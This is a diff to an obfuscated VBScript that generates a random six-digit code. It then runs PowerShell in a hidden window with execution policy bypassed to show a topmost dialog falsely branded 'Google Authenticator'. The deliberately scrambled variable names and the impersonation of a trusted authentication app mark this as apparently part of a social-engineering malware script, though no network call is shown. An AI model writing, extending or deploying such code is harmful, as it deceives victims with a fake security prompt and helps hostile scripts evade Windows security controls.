@@ -20,16 +20,28 @@ otp = array(randomIndex)
 Dim formattedOTP
 formattedOTP = Left(otp, 3) & " " & Mid(otp, 4, 3)
 
-Dim ssssssshl
+Dim ssssssshl, ccccccmd
 Set ssssssshl = CreateObject("WScript.Shell")
 
-ccccccmd = "powershell -WindowStyle Hidden -Command " & _
-      """Add-Type -AssemblyName System.Windows.Forms; " & _
-      "$f=New-Object Windows.Forms.Form; " & _
-      "$f.TopMost=$true; " & _
-      "[System.Windows.Forms.MessageBox]::Show($f,'Authentication code: " & formattedOTP & "','Google Authenticator')"""
+ccccccmd = "Add-Type -AssemblyName System.Windows.Forms;" & _
+      "Add-Type -AssemblyName System.Drawing;" & _
+      "$f=New-Object Windows.Forms.Form;" & _
+      "$f.Text='Google Authenticator';" & _
+      "$f.Size=New-Object Drawing.Size(420,180);" & _
+      "$f.StartPosition='CenterScreen';" & _
+      "$f.TopMost=$true;" & _
+      "$f.Activate();" & _
+      "$l=New-Object Windows.Forms.Label;" & _
+      "$l.AutoSize=$false;" & _
+      "$l.Dock='Fill';" & _
+      "$l.TextAlign='MiddleCenter';" & _
+      "$l.Font=New-Object Drawing.Font('Segoe UI',24);" & _
+      "$l.Text='Authentication Code:" & vbCrLf & formattedOTP & "';" & _
+      "$f.Controls.Add($l);" & _
+      "$f.Add_Shown({$f.Activate()});" & _
+      "[void]$f.ShowDialog();"
 
-ssssssshl.Run ccccccmd, 0, False
+ssssssshl.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & ccccccmd & """", 0, False
 
 Dim aaaaaaabncjds, qwoiughduiobhciwe, fwcwfcuhwfcnhioquf, zbxcvnbzcxvmzxb, pppppppppppooooooooodddd
 Dim oupgmruvfnblgtyuf, wygbvfqiuegwnyeb, eyucvbodibuwquios, wuernvgoreuihvnfgpoeruifvyhbpodia
